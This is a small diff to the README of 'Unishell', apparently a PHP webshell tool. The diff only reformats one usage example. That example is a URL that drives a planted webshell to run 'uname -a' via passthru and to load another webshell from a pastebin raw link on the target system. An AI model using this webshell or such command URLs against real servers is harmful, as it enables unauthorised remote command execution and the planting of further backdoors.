@@ -32,9 +32,9 @@ Unishell is a family of php webshells that based on nano shell (https://github.c
 `http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command&ដ=url`
 
 ***For example***, we want to use the PHP Web Shell from another source in the target system, so it will be:
-```url
-http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=uname -a&ដ=https://pastebin.com/raw/JfLvh0MG
-```
+
+`http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=uname -a&ដ=https://pastebin.com/raw/JfLvh0MG`
+
 ### Screenshot-2
 
 ![handler](https://imgur.com/WCfChGe.png)
